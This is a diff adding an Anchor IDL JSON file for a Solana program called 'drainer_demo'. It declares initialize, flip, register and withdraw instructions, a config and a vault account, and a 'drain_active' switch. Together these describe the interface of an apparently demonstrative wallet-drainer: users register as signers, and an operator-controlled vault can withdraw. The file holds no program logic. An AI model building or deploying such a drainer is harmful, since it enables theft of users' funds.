@@ -1,0 +1,74 @@
+{
+  "address": "DBueKxJaAyKYHyP3bbQE5eEMHLN7ZQfX2PyT7uw2xFhU",
+  "metadata": {
+    "name": "drainer_demo",
+    "version": "0.1.0",
+    "spec": "0.1.0"
+  },
+  "instructions": [
+    {
+      "name": "initialize",
+      "discriminator": [175,175,109,31,13,152,155,237],
+      "accounts": [
+        { "name": "config", "writable": true, "pda": { "seeds": [{ "kind": "const", "value": [99,111,110,102,105,103] }] } },
+        { "name": "vault", "writable": true, "pda": { "seeds": [{ "kind": "const", "value": [118,97,117,108,116] }] } },
+        { "name": "authority", "writable": true, "signer": true },
+        { "name": "system_program", "address": "11111111111111111111111111111111" }
+      ],
+      "args": []
+    },
+    {
+      "name": "flip",
+      "discriminator": [24,243,78,161,192,246,102,103],
+      "accounts": [
+        { "name": "config", "writable": true, "pda": { "seeds": [{ "kind": "const", "value": [99,111,110,102,105,103] }] } },
+        { "name": "authority", "signer": true }
+      ],
+      "args": [
+        { "name": "active", "type": "bool" }
+      ]
+    },
+    {
+      "name": "register",
+      "discriminator": [211,124,67,15,211,194,178,240],
+      "accounts": [
+        { "name": "config", "pda": { "seeds": [{ "kind": "const", "value": [99,111,110,102,105,103] }] } },
+        { "name": "user", "writable": true, "signer": true },
+        { "name": "vault", "writable": true, "pda": { "seeds": [{ "kind": "const", "value": [118,97,117,108,116] }] } },
+        { "name": "system_program", "address": "11111111111111111111111111111111" }
+      ],
+      "args": []
+    },
+    {
+      "name": "withdraw",
+      "discriminator": [183,18,70,156,148,109,161,34],
+      "accounts": [
+        { "name": "config", "pda": { "seeds": [{ "kind": "const", "value": [99,111,110,102,105,103] }] } },
+        { "name": "vault", "writable": true, "pda": { "seeds": [{ "kind": "const", "value": [118,97,117,108,116] }] } },
+        { "name": "authority", "writable": true, "signer": true },
+        { "name": "system_program", "address": "11111111111111111111111111111111" }
+      ],
+      "args": []
+    }
+  ],
+  "accounts": [
+    {
+      "name": "Config",
+      "discriminator": [155,12,170,224,30,250,204,130]
+    }
+  ],
+  "types": [
+    {
+      "name": "Config",
+      "type": {
+        "kind": "struct",
+        "fields": [
+          { "name": "authority", "type": "pubkey" },
+          { "name": "drain_active", "type": "bool" },
+          { "name": "bump", "type": "u8" },
+          { "name": "vault_bump", "type": "u8" }
+        ]
+      }
+    }
+  ]
+}
